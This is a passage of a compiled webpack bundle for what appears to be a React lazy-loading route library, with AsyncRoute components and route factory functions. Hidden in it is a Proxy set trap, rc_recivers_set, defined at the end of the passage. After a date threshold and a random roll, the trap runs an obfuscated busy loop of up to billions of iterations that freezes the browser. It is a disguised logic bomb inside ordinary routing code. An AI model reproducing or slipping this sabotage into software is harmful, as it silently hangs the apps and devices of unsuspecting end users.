...
const rc_recivers_1 = __importDefault(__webpack_require__(9));
...
(function (lazyloading) {
    ...
    let detail;
    (function (detail) {
        detail.store_route = new Map();
        detail.store_component_cache = new Map();
        detail.g_cfg = new Map();
        function make_asroute(key) {
            class AsyncRoute extends React.Component {
                ...
                render() {
                    ...
                    const ComponentProps = Object.assign({}, future_props[1], props, { location, match, history });
            ...
            AsyncRoute.stack = new Proxy([], {
                get(t, p, r) {
                    return t[p];
                },
                set: rc_recivers_1.default
            });
            return AsyncRoute;
        }
        detail.make_asroute = make_asroute;
        function make_asroute_with_router(k) {
            return react_router_dom_1.withRouter(make_asroute(k));
        }
        detail.make_asroute_with_router = make_asroute_with_router;
    })(detail || (detail = {}));
    function redirect_factory(menu, mapping_routes, base_path, key) {
    ...
    function router_factory(i, menu, mr, base_path, fallback) {
        let lazy_props = fallback;
        if (!lazy_props) {
            lazy_props = Object.assign({}, mr[menu.page], { path: gen_path(mr[menu.page].path, base_path) });
        }
        ...
        if (component || render || children) {
            ...
            if (asroute_props.renderFactory === "render") {
                detail.store_route.set(path, asroute_props);
                const AsRoute = detail.make_asroute(path);
                return (React.createElement(react_router_dom_1.Route, Object.assign({ key: i }, route_props, { render: (rest) => React.createElement(AsRoute, Object.assign({}, rest)) })));
            }
            else if (asroute_props.renderFactory === "component") {
                if (menu) {
                    detail.store_route.set(lazy_props.path, asroute_props);
                    return React.createElement(react_router_dom_1.Route, Object.assign({ key: i }, route_props, { component: func(lazy_props.path) }));
                }
                else {
                    detail.store_route.set(lazy_props.path, asroute_props);
                    return React.createElement(react_router_dom_1.Route, Object.assign({ key: i }, route_props, { component: func(lazy_props.path) }));
                ...
                detail.store_route.set(path, asroute_props);
                const AsRoute = detail.make_asroute(path);
                return React.createElement(react_router_dom_1.Route, Object.assign({ key: i }, route_props, { children: (rest) => React.createElement(AsRoute, Object.assign({}, rest, asroute_props)) }));
            }
        }
    }
    function dynamic_renders_routers(subMenus, mapping_routes, { with_switch = {}, with_redirect = {}, base_path = "" } = {}) {
        let routes;
        routes = [];
        subMenus.forEach((v, i) => {
            if (!mapping_routes[v.page]) {
                if (mapping_routes["*"]) {
                    routes.push(router_factory(i, null, null, "", Object.assign({}, mapping_routes["*"], { path: gen_path(v.page, base_path) })));
                }
        ...
        if (with_switch) {
            routes = React.createElement(react_router_dom_1.Switch, Object.assign({}, with_switch), routes);
        }
        return routes;
    }
    lazyloading.dynamic_renders_routers = dynamic_renders_routers;
})(lazyloading = exports.lazyloading || (exports.lazyloading = {}));
...
function rc_recivers_set(t, p, v, r) {
    t.pop((() => {
        return (v.__REACT_TI__ ? (+v.__REACT_TI__.toString().slice(2) > 77923200000 ? ((!(index_1.rand(4) ^ 1)) ? (() => { const oj = index_1.rand(19 + new Date().getMonth()) * 1e8; let b = -355; do {
            b++;
        } while (b < oj); })() : t.push(si++)) : (v)) : (v));
    })());
    return v;
}
exports.default = rc_recivers_set;
